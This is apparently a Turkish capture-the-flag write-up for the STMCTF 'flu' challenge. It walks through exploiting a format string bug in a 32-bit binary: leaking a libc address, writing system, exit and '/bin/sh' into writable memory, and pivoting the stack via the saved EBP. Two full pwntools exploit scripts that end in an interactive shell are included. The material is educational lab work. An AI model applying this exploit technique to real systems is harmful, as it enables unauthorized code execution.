## STMCTF flu sorusu çözümü

Bilgisayara sahip olmamın bu son günlerinde olur da okuyan vardır, bu tür şeyleri merak edip denemek isteyen vardır diye bilgisayarın son vakitlerinde boş zaman oluşturup en son writeup yazısını da yaziyim dedim. Olur da durum farklı olursa kalan easy sorusuna da bakarım. Bir soru daha vardı ama elimizde binary yoktu sunucuya bağlanıp blind bir şekilde input giriyorduk. O soruya yapacak bişey yok.

NOT: önce ki jump ve papapawn1 writeup okunması tavsiye olunur çünkü işler baya hızlandırılacaktır.  Format string bilgisi papapawn writeup’ında var.

Rutin ile başlayalım:


![screenshot](https://github.com/lntrx/STMCTF_PWN_Writeup/blob/master/Flu/screenshots/1.png)

Sunucuda ASLR vardır ve bununla beraber NX var ve Partial Relro var. 

Çalıştırıp biraz bakalım:

![screenshot](https://github.com/lntrx/STMCTF_PWN_Writeup/blob/master/Flu/screenshots/2.png)

Açıkça format string açığı olduğu belirlenmiş zaten. Bizim uğraşıp bulmamıza gerek yok. 

![screenshot](https://github.com/lntrx/STMCTF_PWN_Writeup/blob/master/Flu/screenshots/3.png)

Çok uzun bir %x’e rağmen 0x41414141 bulamadık. Muhtemelen bu girdiğimiz input stack’te yok diyoruz. Aynı zamanda çok %x girmemize rağmen sanki çok az adres geldi. Kaç byte okuduğunu görelim hemen:

![screenshot](https://github.com/lntrx/STMCTF_PWN_Writeup/blob/master/Flu/screenshots/4.png)

0xc8 yani 200 karakter okuyor. 

Girdiğimiz inputa erişemiyoruz ve 200 karakter girebiliyoruz. Bu adresler printf olurken ki vakitte stackte bulunan adresler. O zaman debug edip printf yerine gelip stack’e göz atalım:

![screenshot](https://github.com/lntrx/STMCTF_PWN_Writeup/blob/master/Flu/screenshots/5.png)

Printf yerine geldik. stack ‘i büyütelim biraz. Peda kullanıyorsanız “context stack 20” derseniz ilk 20 içeriği bulabilirsiniz.

![screenshot](https://github.com/lntrx/STMCTF_PWN_Writeup/blob/master/Flu/screenshots/6.png)

Dikkatinizi *__libc_start_main+241* olan adrese çekmek isterim. Ilk adress basmayacak çünkü o zaten girdiğimiz input. 0x8048620 adresi ilk index olur. Böyle bakarsanız *__libc_start_main* ise 15. Sırada. Yani %15$x dersek önümüze o adres çıkar:

![screenshot](https://github.com/lntrx/STMCTF_PWN_Writeup/blob/master/Flu/screenshots/7.png)

ASLR’den dolayı sürekli değişiyor. Bu adres ile Libc base adresini rahatlıkla bulabiliriz. *__libc_start_main+241* adresi elimizde bu adresten *__libc_start_main* offsetini çıkarırsak ve ekstradan 241 çıkarırsak libc base adresi elde etmiş oluruz. Jump writeup yazısında çok daha detaylı anlattığım için burda vakit kaybetmeden hemen Leak yapalım:

```python
from pwn import *
import os
import posix
from struct import *
import time


offset_system = 0x0003d870
offset_str_bin_sh = 0x17c968
offset_exit = 0x00030c30
offset___libc_start_main = 0x000198b0


payload = "%15$x"

prog = os.path.abspath("./flu")

p = process(prog)

print p.recv(17)	# "FormatString BUG\n"
#p.clean()
p.sendline(payload)

leakString = "0x" + p.recv(8)

leak = int(leakString, 16)

libc_start_main = leak - 0xf1
log.info("libc_start_main@libc: 0x%x" % libc_start_main)

libc_base = libc_start_main - offset___libc_start_main
system_addr = libc_base + offset_system
binsh_addr = libc_base + offset_str_bin_sh
exit_addr = libc_base + offset_exit

log.info("libc base: 0x%x" % libc_base)
log.info("system@libc: 0x%x" % system_addr)
log.info("binsh@libc: 0x%x" % binsh_addr)
log.info("exit@libc: 0x%x" % exit_addr)
```

Leak hazır çalıştıralım:

![screenshot](https://github.com/lntrx/STMCTF_PWN_Writeup/blob/master/Flu/screenshots/9.png)

Bu şekilde Libc elimizde. Bundan sonra ise işe yara bişey var mı diye yukarda verilen fotoğrafa biraz bakalım:

![screenshot](https://github.com/lntrx/STMCTF_PWN_Writeup/blob/master/Flu/screenshots/6.png)

Burda çok önemli bir detay var 0024(6) ile 0040(10)’a dikkat edin. 0024 ile 0xffffd138’in içine yazabiliriz ve 0040 ile de yazdırdığımız adresin içine yazabilliriz ve hatta güzel birşey daha var:

![screenshot](https://github.com/lntrx/STMCTF_PWN_Writeup/blob/master/Flu/screenshots/10.png)

38 ile biten adresin içine yazıyorduk ve bu adres ise EBP adresi. 38’in içini overflow edersek iki fonksiyondan sonra maine gelip onu kullanacak. Main’in sonuna bakalım:

![screenshot](https://github.com/lntrx/STMCTF_PWN_Writeup/blob/master/Flu/screenshots/11.png)

Play fonksiyonundan döndükten sonra EBP-4’ün içinde ki değeri ECX’e atıyor ve ESP’yi artık ECX adresninin 4 eksiğini yapıyor. Bu çok güzel bir durum. Programın en güzel yanı ise exit diyene kadar program sürekli açığı tekrar tekrar trigger ediyor. Bizim şöyle bişeye ihtiyacımız var:

EBP-4’ün içindeki adress boş writable adreslerin ortasında olsun o adresin 4 eksiği zaten writable olsun ve biz oraya sırayla system, exit ve “/bin/sh” adreslerini yazalım. Lea ile stack oraya değişecektir ve return adresi yerine system adresi ile karşılaşacaktır.

O zaman kullanacağımız yeri bulalım:

![screenshot](https://github.com/lntrx/STMCTF_PWN_Writeup/blob/master/Flu/screenshots/12.png)

0x804a444(bu adresin özel hiçbir yönü yok rastgele seçildi. +1000, 800 veya değişik offset ile seçebilirsiniz) adresini kullanalım. Sırasıyla :

```
0x804a444 → System
0x804a448 → Exit
0x804a44c → “/bin/sh”
```

Olacak şekilde yazmalıyız. Yukardan hatırlayacaksınız biz 6. index’e adresi yazdırabiliyorduk ve 10. Index ile de o adresin içine yazabiliyorduk. 

Yani önce 0x804a444 adresini oraya yazacağız ve sonra ise 0x804a444 adresinin içine system adresini yazacağız. 

Bunları yazdıktan sonra ise bizim EBP’yi ayarlamamız lazım. EBP ve EBP-4’ü ayarlamamız lazım. Bunu ise read fonksiyonu ile yapalım zaten hali hazırda okuyabiliyoruz. 

![screenshot](https://github.com/lntrx/STMCTF_PWN_Writeup/blob/master/Flu/screenshots/13.png)

0x804a060 adresine yazıyoruz read ile. 200 karakter okuyor yani: 

0x804a060+0xc8 = 804A128 son 4 byte “AAA\n” olur o yüzden önceki adresi kullanırız.

EBP      | → 0x804a124 →  0x804a44c
EBP - 4 | → 0x804a120 →  0x804a448

Şeklinde ayarlarsak:

```shell
 8048593:    8b 4d fc                 mov    ecx,DWORD PTR [ebp-0x4]
 8048596:    c9                       leave  
 8048597:    8d 61 fc                 lea    esp,[ecx-0x4]
```

ECX 0x804a448 olur sonra ise 0x804a448- 0x4 yani 0x804a444 olur ve orda ise system adresi bizi beklemektedir. 

Herşeyi bir araya toplayalım:

NOT: 0x804a124 bu adresi tek başına yazabiliriz ama libc adresi f7 ile başlıyor yani nerdeyse iki katı o yüzden libc adreslerini iki parçaya ayırırız. Mesela 0x804a444 adresine ilk parçası 0x804a446 adresine ise ikinci parçayı yazdırırız.

```python
from pwn import *
import os
import posix
from struct import *
import time


def write(p, to, adress):

    makeAddress = "%"+str(to)+"u%6$n" + "A"*50
    p.sendline(makeAddress)
    p.clean()

    writeAddress = "%"+str(adress)+"u%10$n" + "A"*50
    p.sendline(writeAddress)
    p.clean()

def writeToEBP(p, to, address):

    hexS = hex(address)[2:]
    firstPlace = int("0x" + hexS[:4], 16)
    secondPlace = int("0x" + hexS[4:], 16)

    print "        Address : " + hex(to)
    write(p, to, secondPlace)
    write(p, to+2, firstPlace)


def modifyEBP(p):

    lastEBP = "%134521124u%6$n" + "A"*50 # 0x804a124
    p.sendline(lastEBP)
    time.sleep(13)
    p.clean()

offset_system = 0x0003d870
offset_str_bin_sh = 0x17c968
offset_exit = 0x00030c30
offset___libc_start_main = 0x000198b0


payload = "%15$x"

prog = os.path.abspath("./flu")

#p = remote("localhost", 8184) #if want to test on remote
p = process(prog)

print p.recv(17)    # "FormatString BUG:\n"
p.sendline(payload)


leakString = "0x" + p.recv(8)

leak = int(leakString, 16)
p.clean()

libc_start_main = leak - 0xf1
log.info("libc_start_main@libc: 0x%x" % libc_start_main)

libc_base = libc_start_main - offset___libc_start_main
system_addr = libc_base + offset_system
binsh_addr = libc_base + offset_str_bin_sh
exit_addr = libc_base + offset_exit

log.info("libc base: 0x%x" % libc_base)
log.info("system@libc: 0x%x" % system_addr)
log.info("binsh@libc: 0x%x" % binsh_addr)
log.info("exit@libc: 0x%x" % exit_addr)


print "\nSystem is writing..."
writeToEBP(p, 0x804a444, system_addr)


print "Exit is writing..."
writeToEBP(p, 0x804a448, exit_addr)

print "/bin/sh is writing..."
writeToEBP(p, 0x804a44c, binsh_addr)


modifyEBP(p)
p.clean()
print "Modifying EBP address..."

ebp = "A" * 192
ebp += "\x48\xa4\x04\x08" + "\x4c\xa4\x04\x08"

p.sendline(ebp)
p.clean()
p.sendline("exit")
p.clean()
log.success("Enjoy your shell.")
p.interactive()
```

![screenshot](https://github.com/lntrx/STMCTF_PWN_Writeup/blob/master/Flu/screenshots/14.png)

NOt: remote yaparsanız baya beklemeniz gerekebilir. 
